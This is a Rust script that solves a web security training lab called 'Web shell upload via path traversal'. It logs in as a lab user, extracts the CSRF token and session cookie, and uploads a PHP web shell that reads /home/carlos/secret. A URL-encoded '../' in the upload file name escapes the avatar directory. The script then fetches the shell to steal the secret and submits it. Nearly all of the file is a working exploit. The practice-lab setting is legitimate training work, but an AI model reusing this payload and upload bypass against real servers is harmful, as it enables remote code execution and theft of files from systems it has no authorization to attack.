/*************************************************************************
*
* Author: Ahmed Elqalawy (@elqal3awii)
*
* Date: 12/10/2023
*
* Lab: Web shell upload via path traversal
*
* Steps: 1. Fetch login page
*        2. Extract csrf token and session cookie
*        3. Login as wiener
*        4. Fetch wiener profile
*        5. Upload the shell file via path traversal
*        6. Fetch the uploaded shell file to read the secret
*        7. Submit the solution
*
**************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::Regex;
use reqwest::{
    blocking::{
        multipart::{Form, Part},
        Client, ClientBuilder, Response,
    },
    header::HeaderMap,
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0a490091034482d38206c41d00e20010.web-security-academy.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    print!("{}", "⦗1⦘ Fetching the login page.. ".white());
    io::stdout().flush();

    // fetch login page
    let login_page = client
        .get(format!("{url}/login"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch the login page".red()));

    println!("{}", "OK".green());
    print!(
        "{}",
        "⦗2⦘ Extracting csrf token and session cookie.. ".white(),
    );
    io::stdout().flush();

    // extract session cookie
    let mut session = extract_session_cookie(login_page.headers())
        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));

    // extract csrf token
    let mut csrf = extract_csrf(login_page).expect(&format!("{}", "[!] Failed extract csrf".red()));

    println!("{}", "OK".green());
    print!("{}", "⦗3⦘ Logging in as wiener.. ".white(),);
    io::stdout().flush();

    // login as wiener
    let login = client
        .post(format!("{url}/login"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("username", "wiener"),
            ("password", "peter"),
            ("csrf", &csrf),
        ]))
        .send()
        .expect(&format!("{}", "[!] Failed to login as wiener".red()));

    // extract session cookie of wiener
    session = extract_session_cookie(login.headers())
        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));

    println!("{}", "OK".green());
    print!("{}", "⦗4⦘ Fetching wiener profile.. ".white(),);
    io::stdout().flush();

    // fetch wiener profile
    let wiener = client
        .get(format!("{url}/my-account"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch wiener profile".red()));

    // extract csrf token
    csrf = extract_csrf(wiener).expect(&format!("{}", "[!] Failed extract csrf".red()));

    // the shell file to be uploaded
    let shell_file = r###"<?php echo file_get_contents("/home/carlos/secret") ?>"###;

    // the shell file name
    // you can change this to what you want
    let shell_file_name = "hack.php";

    // the avatar part of the request
    // %2e%2e%2f = ../
    let avatar_part = Part::bytes(shell_file.as_bytes())
        .file_name(format!("%2e%2e%2f{shell_file_name}"))
        .mime_str("application/x-php")
        .expect(&format!(
            "{}",
            "[!] Failed to construct the avatar part".red()
        ));

    // construct the multipart form
    let form = Form::new()
        .part("avatar", avatar_part)
        .text("user", "wiener")
        .text("csrf", csrf);

    println!("{}", "OK".green());
    print!("{}", "⦗5⦘ Uploading the shell file via path traversal.. ".white(),);
    io::stdout().flush();

    // upload the shell file
    client
        .post(format!("{url}/my-account/avatar"))
        .header("Cookie", format!("session={session}"))
        .multipart(form)
        .send()
        .expect(&format!("{}", "[!] Failed to upload the shell file".red()));

    println!("{}", "OK".green());
    print!(
        "{}",
        "⦗6⦘ Fetching the uploaded shell file to read the secret.. ".white(),
    );
    io::stdout().flush();

    // fetch the uploaded shell file
    let uploaded_shell = client
        .get(format!("{url}/files/{shell_file_name}"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to fetch the uploaded shell file".red()
        ));

    // get carlos secret
    let secret = uploaded_shell.text().unwrap();

    println!("{}", "OK".green());
    println!("❯ {} {}", "Secret:".blue(), secret.yellow());
    print!("{} ", "⦗7⦘ Submitting the solution..".white());
    io::stdout().flush();

    // submit the solution
    client
        .post(format!("{url}/submitSolution"))
        .form(&HashMap::from([("answer", secret)]))
        .send()
        .expect(&format!("{}", "[!] Failed to submit the solution".red()));

    println!("{}", "OK".green());
    println!(
        "{} {}",
        "🗹 Check your browser, it should be marked now as"
            .white()
            .bold(),
        "solved".green().bold()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/********************************************
* Function to capture a pattern form a text
*********************************************/
fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.captures(text) {
        Some(text.get(1).unwrap().as_str().to_string())
    } else {
        None
    }
}

/*************************************************
* Function to extract csrf from the response body
**************************************************/
fn extract_csrf(res: Response) -> Option<String> {
    if let Some(csrf) = Document::from(res.text().unwrap().as_str())
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
    {
        Some(csrf.to_string())
    } else {
        None
    }
}

/**********************************************************
* Function to extract session field from the cookie header
***********************************************************/
fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
        Some(session.as_str().to_string())
    } else {
        None
    }
}
